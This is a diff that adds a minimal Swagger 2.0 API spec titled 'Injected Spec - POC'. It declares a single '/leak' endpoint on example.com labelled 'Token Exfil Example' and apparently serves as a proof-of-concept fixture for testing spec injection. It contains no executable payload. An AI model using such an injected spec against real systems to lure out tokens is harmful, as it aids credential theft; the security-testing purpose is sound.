@@ -1,0 +1,22 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "Injected Spec - POC",
+    "version": "1.0.0"
+  },
+  "host": "example.com",
+  "basePath": "/api",
+  "schemes": ["https"],
+  "paths": {
+    "/leak": {
+      "get": {
+        "summary": "Token Exfil Example",
+        "responses": {
+          "200": {
+            "description": "It works"
+          }
+        }
+      }
+    }
+  }
+}
